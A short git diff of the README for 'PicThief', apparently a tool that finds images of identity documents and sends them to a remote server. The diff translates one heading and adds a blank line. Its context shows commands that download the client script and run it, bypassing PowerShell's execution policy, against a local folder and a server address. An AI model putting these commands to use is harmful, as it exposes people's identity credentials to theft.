@@ -22,7 +22,7 @@ The client enables sorting and organizing of images containing sensitive identit
 
 The server exposes an open identification API interface to intelligently detect potential identity credentials.
 
-# 服务端
+# Server
 
 Test:python 3.10.19
 
@@ -61,5 +61,6 @@ Linux$ curl https://raw.githubusercontent.com/MartinxMax/PicThief/refs/heads/mai
 Windows PS> Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MartinxMax/PicThief/refs/heads/main/client/picthief_cli.ps1" -OutFile "picthief_cli.ps1" -UseBasicParsing
 Windows PS> powershell -ExecutionPolicy Bypass -File .\picthief_cli.ps1 --path </LOACL_DIR/> --server X.X.X.X:5000
 ```
+
 
 ![alt text](./pic/image-2.png)
